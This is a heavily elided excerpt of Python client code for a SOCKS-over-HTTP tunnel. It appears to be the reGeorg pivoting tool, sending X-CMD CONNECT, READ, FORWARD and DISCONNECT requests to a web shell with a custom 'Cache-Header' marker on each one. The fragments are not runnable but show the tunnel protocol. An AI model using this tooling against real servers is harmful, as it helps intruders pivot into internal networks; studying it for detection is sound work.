...
class session(Thread):
    ...
    def setupRemoteSession(self, target, port):
        headers = {"X-CMD": "CONNECT", "X-TARGET": target, "X-PORT": port,"Cache-Header":"thisIsMyJob!@"}
        self.target = target
        self.port = port
        cookie = None
    ...
    def closeRemoteSession(self):
        headers = {"X-CMD": "DISCONNECT", "Cookie": self.cookie,"Cache-Header":"thisIsMyJob!@"}
        params = ""
        # myheaders = {"User-Agent": "okhttp/3.10.0"}
        conn = self.httpScheme(host=self.httpHost, port=self.httpPort)
        ...
        while True:
            try:
                if not self.pSocket:
                    break
                data = ""
                headers = {"X-CMD": "READ", "Cookie": self.cookie, "Connection": "Keep-Alive","Cache-Header":"thisIsMyJob!@"}
    ...
    def writer(self):
        ...
        while True:
            try:
                ...
                if not data:
                    break
                headers = {"X-CMD": "FORWARD", "Cookie": self.cookie, "Content-Type": "application/octet-stream", "Connection": "Keep-Alive","Cache-Header":"thisIsMyJob!@"}
...
def askGeorg(connectString):
    ...
    myheaders = {"Cache-Header":"thisIsMyJob!@"}
    conn = httpScheme(host=httpHost, port=httpPort,headers=myheaders)
